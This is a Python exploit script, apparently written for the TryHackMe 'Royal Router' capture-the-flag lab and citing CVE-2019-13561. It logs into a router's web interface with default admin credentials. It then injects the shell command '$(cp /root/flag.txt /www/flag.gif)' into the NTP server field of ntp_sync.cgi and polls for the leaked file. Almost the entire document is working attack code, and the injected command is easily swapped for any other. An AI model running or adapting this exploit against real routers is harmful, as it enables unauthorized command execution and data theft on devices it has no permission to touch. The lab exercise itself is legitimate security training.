#!/usr/bin/env python3
import requests
import time
import sys

# Room Script: https://tryhackme.com/room/hfb1royalrouter
# Medium Article for explanation: https://medium.com/@Sle3pyHead/royal-router-ctf-notes-tryhackme-9ee32c2cd434
# CVE-2019–13561
# TryHackMe Royal Router lab
# Usage: python3 hfb1royalrouter.py 10.201.39.26
# Usage: python3 hfb1royalrouter.py 10.201.39.26 4444 --> if port is different then 80

def sendExploit(targetIP, port=80):
    domain = f"{targetIP}:{port}"
    session = requests.Session()

    headers = {
        "Host": targetIP,
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": f"http://{domain}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Referer": f"http://{domain}/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

    # ---------- Login ----------
    login_url = f"http://{domain}/login.cgi"
    login_data = {
        "html_response_page": "login_fail.asp",
        "login_name": "YWRtaW4A",
        "login_pass": "",
        "graph_id": "8fab6",
        "log_pass": "",
        "graph_code": "",
        "Login": "\u00A0\u00A0\u00A0Log In\u00A0\u00A0\u00A0"
    }

    try:
        r = session.post(login_url, headers=headers, data=login_data, allow_redirects=True, timeout=5)
        print(f"[+] Login status: {r.status_code}")
    except requests.RequestException as e:
        print(f"[-] Login failed: {e}")
        return

    # ---------- Exploit ----------
    ntp_url = f"http://{domain}/ntp_sync.cgi"
    payload = {
        "ntp_server": "$(cp /root/flag.txt /www/flag.gif)"
    }

    try:
        r = session.post(ntp_url, headers=headers, data=payload, timeout=5)
        print(f"[+] Payload sent, status: {r.status_code}")
    except requests.RequestException as e:
        print(f"[-] Exploit request failed: {e}")
        return

    # ---------- Wait and poll for flag ----------
    flag_url = f"http://{domain}/flag.gif"
    print("[!] Waiting for flag to be available...")
    for i in range(15):  # Poll for 15 seconds
        try:
            r = session.get(flag_url, timeout=5)
            if r.status_code == 200 and r.content:
                with open("flag.txt", "wb") as f:
                    f.write(r.content)
                print(f"[+] Flag saved to flag.txt ({len(r.content)} bytes)")
                return
        except requests.RequestException:
            pass
        time.sleep(1)

    print("[-] Flag not available yet. Try again or check if the exploit succeeded.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <target_ip> [port]")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    sendExploit(target_ip, target_port)
